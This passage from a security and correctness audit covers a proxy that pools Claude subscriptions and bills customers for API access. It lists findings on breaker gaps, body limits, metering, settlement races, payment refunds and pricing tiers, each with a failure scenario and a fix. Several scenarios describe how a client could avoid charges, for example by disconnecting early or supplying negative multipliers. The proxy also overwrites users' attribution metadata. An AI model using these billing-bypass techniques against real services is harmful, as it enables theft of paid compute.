- **Failure:** One hundred requests pass `open_for` concurrently during an upstream outage. The first six distinct-subscription failures open the breaker, but the remaining admitted requests are already inside the loop. Each continues up to `max_tries` backend attempts because the loop at line 534 has no breaker check, producing hundreds of calls during the exact outage window the breaker is intended to suppress.  
- **Fix:** Check the breaker before every upstream send and before every retry. Once another request opens it, stop rotation and return the appropriate local overload response. If half-open probing is desired, explicitly permit a bounded number of probes rather than allowing every pre-admitted request to fan out.  

**C51. [MEDIUM · CONFIRMED] The 16 MiB body cap rejects valid Anthropic requests with the wrong status**  
`crates/forward/src/proxy.rs:77` — _request-transparency_  
The proxy imposes a 16 MiB limit even though the Messages API accepts request bodies up to 32 MiB. It also maps limit failures to a generic 400 instead of Anthropic's request-too-large response, so valid multimodal requests fail only through this proxy.  
- **Failure:** A client sends a valid approximately 20 MiB Messages request containing base64 image or PDF content. Anthropic would accept it under the 32 MiB request limit, but `to_bytes(body, BODY_LIMIT)` fails locally and the proxy returns `400 invalid_request_error: body read error` rather than forwarding the request or returning the native 413 shape.  
- **Fix:** Match Anthropic's current request-size limit, distinguish overflow from other body-read failures, and return the same 413 `request_too_large` error shape for oversized input. Keep the limit configurable only if the public contract clearly documents a non-transparent restriction.  

**C52. [MEDIUM · CONFIRMED] The proxy overwrites the caller's end-user attribution metadata**  
`crates/forward/src/proxy.rs:598` — _request-integrity_  
Every Messages request has `metadata.user_id` replaced with a synthetic subscription persona. This is an API-visible request mutation beyond the allowed identity and OAuth injection and destroys the customer's stable end-user attribution used for abuse monitoring and per-user controls.  
- **Failure:** A multi-tenant application sends `metadata.user_id: "hashed-customer-42"` on all requests from one end user. The proxy replaces it with a value derived from whichever pooled subscription and session handled the request. Anthropic sees different users after rotation and cannot correlate that end user's activity; conversely unrelated customers routed through the same persona scheme are attributed according to pool internals rather than the caller's identity.  
- **Fix:** Preserve caller-supplied `metadata.user_id`. If OAuth routing requires an internal persona identifier, carry it in a private header or another mechanism that does not overwrite a documented client field; if no such mechanism exists, document the incompatibility rather than claiming transparent Anthropic semantics.  

**C95. [LOW · PLAUSIBLE] Balance reservation omits bytes injected after the estimate**  
`crates/forward/src/proxy.rs:482` — _balance-enforcement_  
The worst-case input reservation uses `raw.len() + identity.len()`, but the final request later injects a long `metadata.user_id`, a billing system block, and JSON wrapper/escaping bytes. The proof that actual charge cannot exceed the hold is therefore invalid; actual input usage can exceed the reserved ceiling.  
- **Failure:** A low-balance account sends a minimal one-token Messages request. The hold is calculated from the small raw body plus identity text. After reservation, the proxy adds a 64-hex device ID, two UUIDs, metadata JSON, and the billing-header system block. Anthropic reports input usage for the larger final prompt. If that charge exceeds the hold, `account_settle` subtracts the full actual amount, allowing the balance to go negative despite the stated `charge <= hold <= balance` invariant.  
- **Fix:** Build or conservatively size the complete final request, including metadata, billing block, structural JSON, and escaping, before calculating the hold. Since persona fields vary per subscription, reserve against a proven upper bound. Also enforce `actual <= hold` at settlement or retain an additional safety margin so a misestimate cannot make balances negative.  


### Engine · Forward billing/metering (money path)  

**C8. [HIGH · CONFIRMED] Aborting a non-streaming response before the trailing usage object yields a zero charge**  
`crates/forward/src/meter.rs:70` — _charge-bypass_  
`TeeMeter::drop` finalizes whatever prefix has been accumulated, but the non-SSE path requires that prefix to be a complete JSON document. A truncated body is therefore converted to zero usage and the entire hold is refunded. This lets a client consume partial response content without paying for either input or output tokens.  
- **Failure:** A metered client sends `stream:false` with a long output. The upstream completes inference and returns HTTP 200, whose JSON places `content` before the trailing `usage` object. The client reads one or more chunks containing the useful `content` text and closes the connection before the final JSON/usage bytes. `Drop::drop` calls `finalize`; `usage_from_response_json(&self.acc)` fails to parse the truncated JSON and returns `Usage::default()`. `meter.rs` then settles with `actual=0`, fully refunding the reservation even though Anthropic performed the request and the client received useful output.  
- **Fix:** Do not finalize non-SSE billing from an incomplete downstream-consumed prefix. Either fully buffer the non-streaming upstream body before exposing it to the client, or continue draining the upstream body after downstream disconnect so the authoritative `usage` object is obtained. Settlement must not refund a hold merely because the client stopped reading the response.  

**C9. [HIGH · CONFIRMED] SSE disconnects can undercount output by an order of magnitude and erase web-search charges**  
`crates/metering/src/lib.rs:233` — _metering-bypass_  
Before the final cumulative `message_delta`, the parser substitutes `Unicode scalar count / 4` for authoritative output tokens and has no fallback for `web_search_requests`. Character count is not a safe lower bound for Claude tokens: many CJK characters and emoji consume one or multiple tokens per character, while this code charges only 0.25 token per character. Any web searches completed before disconnect are charged as zero if their final usage delta was not received.  
- **Failure:** A client requests an SSE answer containing 4,000 emoji/CJK characters and a web search, receives the search-derived answer, then disconnects before the final `message_delta`. The fallback records only `4000 / 4 = 1000` output tokens even when the tokenizer charged several thousand tokens, and `web_search_requests` remains zero because it is populated only from usage objects. Repeating this pattern obtains output and $0.01 searches at a substantial discount while still passing the initial balance reservation.  
- **Fix:** Continue draining the upstream SSE stream after the downstream client disconnects and settle from the final authoritative usage. If that is impossible, do not treat `chars/4` as authoritative money data; preserve the full reservation or use a provider-supported incremental usage signal. Web-search reservations must not be released until authoritative tool usage is known.  

**C10. [HIGH · CONFIRMED] Claude Sonnet 5 usage is overcharged by 50% during the active introductory-pricing period**  
`crates/metering/src/lib.rs:110` — _pricing-correctness_  
All Sonnet model IDs are priced at the standard $3 input / $15 output rates. As of 2026-07-16, Claude Sonnet 5 officially costs $2 input, $0.20 cache read, $2.50 5-minute cache write, $4 1-hour cache write, and $10 output per million tokens through 2026-08-31. Every Sonnet 5 charge and ledger row is therefore inflated by 50%, and the overly large hold also truncates outputs earlier than the customer's real balance requires. Official source: https://platform.claude.com/docs/en/about-claude/pricing
- **Failure:** A Sonnet 5 response reports 1,000,000 output tokens and the account multiplier is 4000. The official real cost is $10, so the customer charge should be $4. The code assigns the generic Sonnet output price of $15 and writes a $6 charge ledger entry. Cache and input-heavy requests are inflated by the same 50%.  
- **Fix:** Give Sonnet 5 its own effective-dated price schedule: use 2000/200/2500/4000/10000 through 2026-08-31 and switch to 3000/300/3750/6000/15000 starting 2026-09-01. Keep historical model rates separate and add boundary-date tests so a deployment date cannot silently change customer charges.  

**C53. [MEDIUM · CONFIRMED] Actual settlement is allowed to exceed the hold, so hidden tool-prompt tokens can drive balances negative**  
`crates/forward/src/meter.rs:89` — _balance-enforcement_  
The settlement path sends the full computed charge without checking `charge <= hold`. The reservation calculation traced in `proxy.rs` estimates input from request bytes, but Anthropic bills model-specific tool-use system-prompt tokens that are not present in those bytes, as well as proxy-injected billing/metadata content. Therefore the documented `charge <= hold <= balance` invariant is false, and concurrent requests can all pass reservation before their excess charges push the shared account below zero.  
- **Failure:** Use Claude Opus 4.7 with a very small request and a minimal custom tool definition. Anthropic currently adds 675 tool-use system-prompt tokens for an auto tool request, while the reserve estimates only `(raw.len + identity.len)` and values it at the 1-hour cache-write rate. A compact request can reserve less than the actual input charge before any output. With an account funded to exactly the sum of 20 computed holds, 20 concurrent requests all reserve successfully; each final settlement debits its full actual charge above its hold, leaving the account negative after all responses were served.  
- **Fix:** Base the hold on an authoritative `count_tokens` result for the exact post-injection request, including tool definitions and hidden tool overhead, and include every pricing modifier. Add a hard invariant at the settlement/storage boundary that detects and prevents `actual > hold`; alert rather than silently allowing negative balances. If exact preflight counting is unavailable, reserve a demonstrably sufficient worst-case overhead for every supported feature.  

**C54. [MEDIUM · CONFIRMED] Cancellation after a successful reserve reply can strand the hold indefinitely**  
`crates/forward/src/billing.rs:74` — _race-condition_  
The writer refunds a committed reservation only when `oneshot::Sender::send` reports that the receiver is already gone. There is a cancellation window after `send` succeeds but before the awaiting handler observes the result and constructs its `HoldGuard`. If the handler is dropped in that window, neither side performs compensation, leaving `reserved_nano` deducted until process restart.  
- **Failure:** A user with one key in a shared team account opens many requests and disconnects immediately after sending each body. For a request where the writer commits the hold and `reply.send(res)` succeeds, axum can cancel the request future before `reserve(...).await` returns to `proxy.rs`. The receiver then disappears after the successful send, the writer does not run its refund branch, and no `HoldGuard` was created. Repeating the race freezes increasing portions of the team's spendable balance and causes later legitimate requests to receive 402.  
- **Fix:** Represent each hold with a durable unique reservation ID and settle/cancel by that ID. The caller should own a cancellation guard from before it awaits completion, and cancellation must enqueue an idempotent cancel for that specific reservation. An aggregate account-level `reserved_nano` is insufficient to safely compensate an ambiguous async handoff.  

**C55. [MEDIUM · CONFIRMED] The 1.1x US inference-residency premium is omitted from both spend and customer charges**  
`crates/forward/src/meter.rs:75` — _pricing-modifier_  
Pricing is selected solely from the served model. Claude Opus 4.6, Sonnet 4.6, and later models charge a 1.1x multiplier on all token categories when `inference_geo: "us"` is requested, and the response usage reports the inference geography. The metering `Usage` type discards that field, so clients can select US-only inference while being billed at global rates. Official source: https://platform.claude.com/docs/en/about-claude/pricing#data-residency-pricing
- **Failure:** A client sends an Opus 4.8 request with `inference_geo: "us"` and consumes 1,000,000 output tokens. The provider-equivalent cost is $27.50, but `model_prices(price_model)` returns $25 and both `pool.record_spend` and the account ledger use that lower amount. At multiplier 4000, the customer pays $10 instead of $11 on every such request.  
- **Fix:** Parse the response's authoritative inference geography into `Usage` or a separate pricing context and apply 1.1x to input, output, and all cache categories. Apply the same modifier during reservation so the hold remains an upper bound. Add tests for global versus US pricing on every supported model generation.  

**C56. [MEDIUM · CONFIRMED] Settlement database failures are silently discarded, permanently removing charges from the commerce ledger**  
`crates/forward/src/billing.rs:84` — _ledger-integrity_  
The billing writer converts every `account_settle` error into `None`, emits no error or retry, and detached settlements have no reply channel. A successful inference can therefore disappear from the authoritative charge ledger. Because commerce advances an idempotent cursor over ledger IDs, a missing charge cannot be reconstructed or consumed later.  
- **Failure:** After a successful metered response, SQLite returns a transient I/O/full-disk/commit error while processing the detached settlement. `.ok().flatten()` discards the error; no charge or usage event is written and no alert is emitted. The previously committed hold remains reserved. On restart, `reconcile_reservations` refunds it, so the inference becomes free and the B2C pricing worker never receives a charge row for that usage.  
- **Fix:** Do not collapse settlement errors. Persist an idempotent pending-settlement record keyed by a unique request/reservation ID and retry until the charge transaction commits; log and alert terminal failures. Make charge and usage-event insertion one transaction where possible, and expose writer health so the service can stop serving metered traffic if durable settlement is unavailable.  


### Engine · Server (config/Control API/poller)  

**C11. [HIGH · CONFIRMED] Startup reconciliation can refund reservations owned by a still-running instance**  
`crates/server/src/main.rs:456` — _race-condition_  
The single-instance check is a PID-file convention rather than an acquired process lock. It only recognizes another server if `/proc/<pid>/cmdline` contains an argument exactly equal to `serve`, ignores `/proc` and lock-file errors, overwrites the PID file before binding the listener, and then reconciles every outstanding reservation. This can make funds reserved by an old instance spendable again while its requests are still running.  
- **Failure:** An existing server was started as `claude-api` with no subcommand, which is explicitly treated as `Serve`, so its cmdline has no `serve` argument. During a rolling deployment, or from another container/PID namespace sharing the SQLite file, a new instance reads the old PID but classifies it as not alive, refunds all live holds, and starts serving on another port. New requests reserve the refunded balance while old streams are still producing output; when the old instance settles, the same funds have funded both requests and the account can go negative. Even a second instance that later fails to bind has already reconciled and overwritten the lock file.  
- **Fix:** Acquire a real OS advisory/exclusive lock on a file descriptor and hold it for the entire server lifetime. Acquire it before reconciliation and before accepting work; abort or definitively skip reconciliation when the lock is unavailable. Do not infer process identity from `/proc` arguments or PID visibility across namespaces.  

**C12. [HIGH · CONFIRMED] Graceful shutdown silently exits after an unacknowledged billing flush**  
`crates/server/src/main.rs:527` — _financial-correctness_  
The code imposes a ten-second timeout on the billing actor's FIFO flush and discards whether the timeout elapsed. Returning from `main` terminates the process and its detached actor thread even if settled usage is still queued, breaking the guarantee that completed streams are charged before shutdown.  
- **Failure:** A deployment stops the server while the billing writer has more than ten seconds of queued settles, for example during a disk stall or a large request burst. `timeout(..., b.flush())` expires, the error is ignored, and the process exits with completed requests still uncommitted. On restart, reservation reconciliation refunds the remaining holds, so those successful requests become free and their charge-ledger/usage rows are permanently missing.  
- **Fix:** Do not exit until the flush barrier is acknowledged. If shutdown must have a hard deadline, surface timeout as a fatal shutdown failure and use a durable settlement queue/recovery record that can be replayed before reconciliation; never treat an unflushed queue as safe to discard.  

**C57. [MEDIUM · CONFIRMED] A top-up reference collision on another account is returned as successful idempotency**  
`crates/server/src/admin.rs:186` — _idempotency_  
The endpoint requires a reference but does not scope or qualify it. The traced ledger enforces one global unique `ref` for all top-ups and treats every uniqueness violation as a replay, returning the target account's current balance with HTTP 200 without checking which account or amount originally used the reference.  
- **Failure:** Account A is credited by provider A with transaction reference `123`. Later account B receives a legitimate payment from provider B whose transaction identifier is also `123`. B's balance update is rolled back, but `/credit` returns B's unchanged balance as a successful response. The commerce worker advances its webhook/cursor and the customer's paid funds are silently never credited.  
- **Fix:** Keep global replay protection, but on conflict load the existing top-up by reference. Return idempotent success only when account ID and amount match exactly; return 409 for cross-account or amount mismatches. Also require a provider-qualified reference such as `<provider>:<transaction-id>`.  

**C58. [MEDIUM · CONFIRMED] The Control API converts monetary input through f64**  
`crates/server/src/admin.rs:161` — _precision-loss_  
The credit request accepts `usd: Option<f64>` and converts it by floating-point multiplication and rounding. This directly violates the integer-money invariant and permits decimal inputs whose exact nanodollar value cannot be represented by a JavaScript/Rust double.  
- **Failure:** A caller submits `{"usd":9007199.254740993,"ref":"p:1"}`, whose intended value is 9,007,199,254,740,993 nanodollars. That integer is above f64's exact-integer range, so parsing and multiplying by 1e9 rounds it to a neighboring nanodollar value before the balance update. Reconciliation against the provider's integer amount then differs even though both systems received the same nominal amount.  
- **Fix:** Remove the floating-point `usd` path from the Control API and accept only an integer `amount_nano` encoded as an integer/decimal string. If human-readable USD is needed by the CLI, parse a digit string with exact decimal arithmetic and convert to integer units before calling the engine.  

**C59. [MEDIUM · CONFIRMED] The liveness poller duplicates 429 attribution and can cool to the wrong reset**  
`crates/server/src/poller.rs:151` — _state-machine_  
Probe 429 handling independently guesses the binding window using a hard-coded `util7d >= 0.98` threshold. It discards Anthropic's authoritative `representative-claim` and differs from the production forwarding helper, which uses the claim and lower fallback thresholds. This duplication produces divergent cooling state for the same upstream limit response and places forwarding business logic in the composition crate.  
- **Failure:** A probe receives a 429 with `representative-claim=seven_day`, `util7d=0.97`, `util5h=0.99`, a five-hour reset in one hour, and a seven-day reset in three days. The poller selects `reset5h`, wakes after one hour, and probes the still-exhausted weekly account again; this repeats and can keep the subscription unavailable/noisy instead of cooling once until the actual three-day reset.  
- **Fix:** Move all 429 classification into `forward` and expose one reusable result/helper to the server loop. Preserve `representative-claim`, require reset timestamps to be in the future, and use the same bounded cooling policy for probes and live traffic.  

**C60. [MEDIUM · CONFIRMED] serve bypasses the repository's sole environment-parsing boundary**  
`crates/server/src/main.rs:409` — _dependency-direction_  
The project requires every environment read to occur in `config.rs`, but `serve` directly reads four additional variables for reader count, global concurrency, ledger retention, and metrics retention. These values are absent from `Settings`, bypass centralized parsing/validation, and make runtime behavior depend on hidden configuration reads after composition has supposedly completed.  
- **Failure:** An operator sets an invalid value such as `CLAUDE_API_MAX_CONCURRENT=0`. `Settings::from_env` succeeds because it never sees the field, and `serve` constructs a zero-permit semaphore, so the process starts and logs itself ready while every forwarded request is rejected. A centralized validated `Settings` could have failed startup with an actionable error instead.  
- **Fix:** Add typed fields for all four values to `Settings`, parse and range-check them in `config.rs`, and make `serve` consume only the already-built settings. Reject zero/invalid concurrency and nonsensical retention values during startup.  

**C96. [LOW · PLAUSIBLE] Account creation accepts negative multipliers that make inference free**  
`crates/server/src/admin.rs:65` — _missing-validation_  
`create_account` writes a caller-supplied `mult_bp` without the 0..10000 validation enforced by the pricing-update endpoint. A negative multiplier crosses into billing unchanged; the reserve path treats every multiplier `<= 0` as free, and settlement clamps the resulting negative charge to zero.  
- **Failure:** The control service sends `POST /admin/account` with `{"handle":"user-1","mult_bp":-1}`, then credits and issues a key. Every `/v1/messages` request for that key obtains a zero hold and settles at zero, allowing unlimited successful inference without reducing the account balance. The same malformed value cannot be set later through `/pricing`, showing that creation bypasses the intended invariant.  
- **Fix:** Validate both the request value and `default_mult_bp` against the same allowed range before account creation. Reject invalid configuration at startup rather than persisting it, and consider a strictly positive lower bound if free accounts are not an intentional product feature.  

**C97. [LOW · CONFIRMED] The legacy revoke route places a live API key in the URL**  
`crates/server/src/http.rs:61` — _secret-exposure_  
A usable `sk-pool-...` credential is accepted as a path segment for key revocation. Request URLs are routinely retained by reverse-proxy access logs, tracing middleware, load balancers, APM systems, and shell history, so this route expands a one-time-issued secret into multiple durable copies and violates the invariant that revocation uses the non-secret `key_id`.  
- **Failure:** An operator or older commerce client calls `POST /admin/key/sk-pool-<secret>/status`. The reverse proxy logs the full request target. Anyone with read access to operational logs can copy that still-active key and use it for metered inference until revocation completes, or later if the attempted status change failed.  
- **Fix:** Remove or disable the secret-in-path endpoint and require the `key_id` route. If a compatibility period is unavoidable, accept the secret only in a non-logged request body, explicitly suppress request-target logging for that route, and set a short removal deadline.  

**C98. [LOW · CONFIRMED] An empty handle aliases unrelated registrations to one engine account**  
`crates/server/src/admin.rs:54` — _account-isolation_  
The optional external identity handle is neither trimmed nor rejected when empty. Because account creation is idempotent by exact handle and the database makes every non-null handle unique, the empty string becomes a valid global identity shared by every request that supplies it.  
- **Failure:** A commerce provisioning bug sends `{"handle":""}` for two different newly registered users. The first request creates an account with the empty handle; the second finds and returns that same account. Keys issued for both users then share one balance and expose each user's spending/account state through the shared engine account.  
- **Fix:** Normalize the handle once at the boundary: trim it and reject an empty result. Prefer requiring a typed, stable commerce user identifier for online provisioning, and use `None` only for explicit administrative accounts where idempotent external identity is not needed.  


### Backend · Account + engine provisioning  

**C13. [HIGH · CONFIRMED] Stale credit workers can confirm another lease and apply the same top-up pricing effect more than once**  
`packages/db/src/credits.ts:63` — _race-condition-idempotency_  
Credit state transitions are guarded only by `id` and the generic `processing` status, not by the worker/lease that claimed the row. `recoverStaleCredits` clears and reassigns a live lease, while `confirmCredit` and `retryCredit` cannot distinguish the old worker from the new one and do not report whether they actually transitioned the row. The traced caller runs `applyTopupTier` after every successful `confirmCredit` call without checking that this worker won the transition, so an idempotently replayed engine credit can still be counted multiple times in commerce pricing.  
- **Failure:** Worker A claims credit C and remains in the engine response-body phase for over five minutes. During a rolling restart, worker B calls `recoverStaleCredits`, reclaims C, and begins the same idempotent engine credit. A then returns first: because B has put C back into `processing`, A's `confirmCredit(C)` confirms B's lease and applies the top-up tier increment. B later receives the idempotent success; its `confirmCredit(C)` silently updates zero rows, but the caller still applies the top-up tier increment again. The engine balance is credited once, while `cumulative_topup_nano` and the resulting customer discount can advance twice.  
- **Fix:** Issue a unique lease token on claim and require it in every confirm/retry predicate (`id`, `status`, and lease token/locked_by). Return whether the transition actually occurred and perform any downstream pricing mutation only for the winning transition. Make the pricing mutation independently idempotent with a unique credit/payment or engine-ledger identifier, ideally consuming authoritative engine ledger rows in one transaction.  

**C62. [MEDIUM · PLAUSIBLE] Account-bound engine responses are not bound to the requested account, enabling cross-tenant disclosure and key control after a misrouted response**  
`packages/engine-client/src/index.ts:76` — _authorization-response-binding_  
The engine schemas include an `account` field, but `getAccount`, `listKeys`, `issueKey`, `getLedger`, `getUsage`, and `creditAccount` validate only response shape and never verify that the returned account equals the account requested. The service therefore treats any structurally valid cross-account payload as belonging to the authenticated user.  
- **Failure:** Alice requests `GET /api-keys` for `acct_alice`, but an engine regression or misrouting fault returns a valid key-list payload whose `account` is `acct_bob`. The client discards that account field and AccountService persists Bob's `key_id` under Alice. Alice receives the new commerce key UUID and can call `DELETE /api-keys/:id`, causing the server to disable Bob's engine key. Equivalent mismatches disclose Bob's balance/ledger/usage; a mismatched `issueKey` response would hand Alice Bob's full `sk-pool-...` secret.  
- **Fix:** After schema parsing, compare every returned `account` with the requested account ID and throw a non-retryable `EngineClientError` on mismatch. Apply this to account reads, key listing/issuance, ledger, usage, and credit responses before any data is returned or persisted.  

**C63. [MEDIUM · CONFIRMED] An API key can be persisted verbatim through the user-controlled label and audit metadata**  
`packages/db/src/engine.ts:71` — _secret-persistence_  
The key label is treated as harmless metadata and is stored both in `api_keys.label` and `audit_log.metadata`, but the accepted label format allows a complete `sk-pool-...` credential. This creates a direct path that violates the invariant that usable pool keys never enter commerce PostgreSQL.  
- **Failure:** A user creates key K1 and receives its full 56-character `sk-pool-...` value. The user then creates K2 with `{"label":"<full K1>"}`. The label satisfies the current 1–100 character schema, is echoed by the engine, and is inserted into `api_keys.label` and JSON audit metadata. K1 is now present in database rows/backups and is returned repeatedly as K2's label when keys are listed, rather than existing only in K1's one-time issuance response.  
- **Fix:** Reject key-shaped values in the API-key label schema and repeat that validation defensively at the persistence boundary. Never copy a rejected label into audit metadata; store a fixed redaction marker if audit visibility is required.  

**C64. [MEDIUM · CONFIRMED] The alleged masked-key field can contain and persist a full reusable secret**  
`apps/api/src/account.service.ts:121` — _secret-validation_  
Key listing blindly trusts the engine's `key_masked` string, persists it in commerce PostgreSQL, and returns it to the browser. The transport schema only requires a non-empty string, so it does not enforce that the value is actually masked or reject a complete `sk-pool-...` credential.  
- **Failure:** After an engine version regression, `/admin/account/acct_alice/keys` returns a valid-looking entry with `key_masked` equal to the full raw key rather than a mask. Alice's next `GET /api-keys` causes `syncEngineApiKey` to store the reusable key in `api_keys.key_masked`, and the endpoint returns it on every subsequent list request. The one-time-display and no-commerce-storage guarantees are both broken.  
- **Fix:** Define and enforce a strict masked-key schema at the engine-client boundary, explicitly rejecting strings that match the full pool-key format. Recheck before database persistence so a malformed upstream response cannot place a usable credential in `key_masked`.  

**C65. [MEDIUM · CONFIRMED] In-flight provisioning can overwrite a concurrent disabled state and reactivate the account**  
`apps/api/src/account.service.ts:35` — _authorization-state-race_  
`ensureEngineAccount` checks the mapping status only before performing remote provisioning. After the engine calls, it unconditionally invokes completion or failure state updates and returns the newly obtained account ID without verifying that the database transition succeeded or that the mapping was not disabled in the meantime. The traced completion query also permits an update whenever `engine_account_id IS NULL`, even if status is already `disabled`; the failure query overwrites every status with `error`.  
- **Failure:** A user with an `error`/`pending` mapping repeatedly calls an account endpoint while an operator disables that mapping. One request passed the initial status check before the disable and is still provisioning. If it succeeds after the disable, `completeEngineAccount` changes the disabled row back to `active` when its account ID is null, and AccountService returns the engine account. If provisioning fails instead, `failEngineAccount` changes `disabled` to `error`, allowing the user's next request to provision again. The administrative disable is therefore not durable against an in-flight user request.  
- **Fix:** Use a versioned or status-specific compare-and-set transition that only completes/fails the exact pending/error attempt and never updates a disabled row. Return and verify the affected-row count; if the transition loses to a disable, do not return the account and compensate any newly issued engine resources.  


### Backend · Payments / checkout  

**C14. [HIGH · CONFIRMED] Refunded payments retain or still execute their engine credit**  
`packages/db/src/payments.ts:143` — _payment-state-machine_  
The refund branch marks the commerce payment and checkout as refunded but never cancels a queued engine credit or reverses an already confirmed one. This breaks the money-in invariant that engine balance must correspond to retained provider funds, and the omission is race-prone because the worker can claim the untouched credit concurrently or after the refund transaction.  
- **Failure:** A user completes a $100 checkout. The paid webhook inserts an `engine_credits` row for 100,000,000,000 nanoUSD with status `pending`. Before the worker claims it, Cryptomus refunds the payment and sends `refund_paid`. This branch changes `payments.status` to `refunded` but leaves the credit pending. The worker subsequently credits the engine account by $100, so the user receives the provider refund and keeps $100 of spendable API credit. If the credit was already confirmed, the same code records the refund without any debit/reversal.  
- **Fix:** Handle refund and credit state atomically. Lock the checkout's credit row in the refund transaction; cancel a still-pending/retry credit, and enqueue a durable, idempotent engine debit/adjustment for processing or confirmed credits using a unique refund reference. Coordinate with worker leases so a concurrent credit either cannot execute or is deterministically reversed. Do not expose the checkout as fully refunded until that durable compensation is recorded.  

**C66. [MEDIUM · CONFIRMED] Final underpayments are permanently represented as pending checkouts**  
`packages/payments/src/cryptomus.ts:205` — _incorrect-state-machine_  
Cryptomus provides `is_final`, and the invoice is deliberately created with multiple-payment support, but state mapping ignores finality and maps every unrecognized status—including terminal `wrong_amount`—to `pending`. The database therefore cannot distinguish an underpayment that may still be topped up from a finalized, expired underpayment.  
- **Failure:** A user opens a $100 checkout, pays $90, and does not supply the remainder before the invoice expires. Cryptomus reports `status: "wrong_amount"` with `is_final: true`. The adapter returns state `pending`; `applyVerifiedCheckoutPaymentEvent` writes the checkout back to `pending` and does not set `completed_at`. The checkout URL is expired and cannot receive the remainder, but commerce keeps the payment session pending forever and has no terminal/manual-review path for the funds already received.  
- **Fix:** Carry `is_final` into the verified-payment decision. Map an in-progress underpayment status such as `wrong_amount_waiting` to `pending`, but map final `wrong_amount`/expired invoices to a terminal failed, canceled, or explicit manual-review state. Persist the actual received amount needed for refund/reconciliation and set completion metadata for terminal outcomes.  

**C100. [LOW · CONFIRMED] DigiSeller monetary values are parsed through JavaScript numbers**  
`packages/payments/src/digiseller.ts:23` — _integer-precision_  
Both DigiSeller response schemas permit provider monetary fields as `z.number()`. By the time Zod validates them, `response.json()` has already converted the JSON token to a binary JavaScript number; `decimalString` merely stringifies the potentially rounded value. This directly violates the repository invariant that provider money must remain bigint or decimal string throughout the commerce boundary.  
- **Failure:** If DigiSeller returns a numeric JSON monetary token `9007199254740993`, JavaScript parses it as `9007199254740992`. The schema accepts it and `decimalString` returns the rounded string, so later amount matching, persistence, or credit calculation operates on a different amount than the provider supplied. Numeric fractional values can also be emitted in exponent notation when stringified, losing the provider's exact decimal representation.  
- **Fix:** Read DigiSeller responses as text and parse them with a lossless JSON parser configured to preserve numeric tokens as strings, then validate monetary fields as canonical decimal strings only. Never admit a JavaScript `number` into `VerifiedProviderPayment` monetary fields; convert to integer minor/nano units with decimal-string arithmetic at the boundary.  


### Backend · Pricing + workers  

**C15. [HIGH · CONFIRMED] B2C tier upgrades are derived from credits instead of authoritative charge-ledger spend**  
`packages/db/src/pricing.ts:225` — _pricing-correctness_  
The ledger consumer records charge rows but never promotes tiers from them; promotions instead happen in applyTopupTier from credited balance. This violates the invariant that B2C pricing derives only from idempotently consumed engine charge-ledger rows and contradicts docs/commerce/PRICING.md's UTC-month local-spend model.
- **Failure:** A Starter customer makes no new topups but incurs exactly $25 of local engine charges in July. The worker inserts those charge events and updates pricing_months/tier_window_spent_nano, but current_tier remains Starter at multiplier 4000; docs/commerce/PRICING.md requires immediate Builder pricing at multiplier 3500. Conversely, a customer who tops up $100 and spends $0 is promoted to Builder even though the authoritative usage ledger shows no qualifying spend.
- **Fix:** Implement the docs/commerce/PRICING.md state machine inside the idempotent ledger-page transaction: update the correct UTC pricing month from newly inserted charge events, compute promotions from exact bigint monthly spend, and enqueue multiplier changes atomically with the event/cursor update. Remove topup-driven tier promotion.

**C16. [HIGH · CONFIRMED] The implemented B2C thresholds do not match docs/commerce/PRICING.md**
`apps/web/src/lib/pricing-tiers.ts:7` — _pricing-math_  
The shared/UI thresholds are $100/$250/$500/$1,000, while docs/commerce/PRICING.md specifies local monthly-spend thresholds of $25/$75/$200/$500 for Builder through Scale. The contracts table used by the database contains the same incorrect larger thresholds.
- **Failure:** A customer reaches $75 of qualifying local spend. The documented contract says the customer is Pro at a 70% discount, but the implemented table does not reach Pro until $250, so the customer remains on a more expensive multiplier.  
- **Fix:** Use one authoritative shared bigint tier table matching docs/commerce/PRICING.md: 25_000_000_000n, 75_000_000_000n, 200_000_000_000n, and 500_000_000_000n, and derive the web presentation from that contract rather than duplicating values.

**C17. [HIGH · CONFIRMED] A confirmed paid credit can permanently miss tier accounting**  
`apps/worker/src/credit-worker.service.ts:55` — _atomicity_  
The worker marks the credit confirmed before applying its tier effect, and tier application is explicitly best-effort with no durable marker or retry job. Once confirmed, the credit is no longer claimable, so any crash or database failure in the gap permanently omits the payment from cumulative tier state.  
- **Failure:** A $100 payment is credited to the engine. confirmCredit succeeds and changes engine_credits.status to `confirmed`; then the process crashes before applyTopupTier, or applyTopupTier fails during a transient PostgreSQL error. After restart the confirmed credit is never claimed again, cumulative_topup_nano remains unchanged, and the customer never receives the tier attributed to the paid topup. A later $1 topup adds only $1 and does not "catch up" the missing $100.  
- **Fix:** Make the pricing effect durable and idempotent. In the same PostgreSQL transaction that confirms the credit, insert a uniquely keyed pricing event/job using the credit ID; process that event with an ON CONFLICT dedupe marker. Do not acknowledge the pricing side effect merely by logging its failure.  

**C18. [HIGH · CONFIRMED] Overwriting an in-flight pricing job can leave the engine at an obsolete multiplier**  
`packages/db/src/pricing.ts:463` — _race-condition_  
There is only one mutable job row per user. enqueuePricingJob overwrites even a `processing` row, resets it to `pending`, and clears its lease. This permits two multiplier writes for different generations to run concurrently, while confirmation guards only the database row and cannot prevent the older engine request from completing last.  
- **Failure:** Worker A claims Builder multiplier 3500 and begins the engine request. The customer reaches Pro; enqueuePricingJob rewrites the same row to pending multiplier 3000. Worker B claims it, sets the engine to 3000, and confirms the row. A's older request then completes and sets the engine back to 3500. A's confirm is a no-op because the row now contains 3000, leaving the database job `confirmed` for 3000 while the authoritative engine actually charges at 3500 indefinitely.  
- **Fix:** Use immutable, generation-numbered jobs and serialize writes per engine account. A newer generation must not be claimable while an older request is in flight, or the worker must perform a compare-and-set/verification after the engine call and enqueue another synchronization whenever the completed generation is no longer current.  

**C19. [HIGH · CONFIRMED] Tier windows are closed even when ledger synchronization failed**  
`apps/worker/src/pricing-worker.service.ts:55` — _state-machine_  
Per-target ledger failures are caught and ignored, after which closeElapsedTierWindows runs over all customers. Window closure therefore makes irreversible downgrade decisions from known-incomplete usage data.  
- **Failure:** A Builder customer has $50 of qualifying engine charges, but commerce has synchronized only $40 when the engine ledger endpoint temporarily fails. The target error is logged, then the elapsed window is closed and the customer is downgraded because the local counter is below $50. When the missing $10 is synchronized later it only increments the new window counter; no code restores the incorrectly lost tier.  
- **Fix:** Close a customer's period only after proving its ledger is caught up through a stable engine watermark for the cutoff. Persist per-account sync success/watermark and exclude failed or lagging targets from closure; ideally perform cutoff accounting directly from deduplicated events in one transaction.  

**C20. [HIGH · CONFIRMED] Retention-window accounting ignores each charge's timestamp**  
